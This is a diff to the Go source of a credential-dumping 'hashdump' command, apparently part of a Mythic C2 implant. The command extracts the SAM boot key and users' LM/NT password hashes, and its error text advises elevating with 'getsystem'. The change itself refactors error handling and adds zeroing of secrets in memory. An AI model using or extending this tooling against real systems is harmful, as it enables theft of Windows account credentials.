@@ -49,11 +49,7 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	var args hashdumpArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -65,39 +61,31 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// Step 1: Extract boot key from SYSTEM hive
 	bootKey, err := extractBootKey()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
 	}
+	defer structs.ZeroBytes(bootKey)
 
 	// Step 2: Read SAM F value and derive hashed boot key
 	hashedBootKey, samRevision, err := deriveHashedBootKey(bootKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to derive hashed boot key: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to derive hashed boot key: %v", err)
 	}
+	defer structs.ZeroBytes(hashedBootKey)
 
 	// Step 3: Enumerate user accounts and extract hashes
 	users, err := enumerateAndDecryptUsers(hashedBootKey, samRevision)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to enumerate users: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to enumerate users: %v", err)
 	}
+	defer func() {
+		for i := range users {
+			structs.ZeroString(&users[i].lmHash)
+			structs.ZeroString(&users[i].ntHash)
+		}
+	}()
 
 	if len(users) == 0 {
-		return structs.CommandResult{
-			Output:    "No user accounts found in SAM database.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("No user accounts found in SAM database.")
 	}
 
 	// Format output and build credential entries for Mythic's credential vault
